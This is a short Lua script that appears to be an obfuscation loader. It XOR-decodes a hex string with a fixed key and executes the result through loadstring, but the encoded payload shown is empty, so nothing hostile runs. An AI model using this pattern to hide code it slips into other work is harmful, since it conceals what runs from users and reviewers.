local k={2,66,26,112,244,223,198,144,190,195,94,183,178,252,248,56,127,23,201,110,181,61,205,121,63,123,129,130,144,32,157,144}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
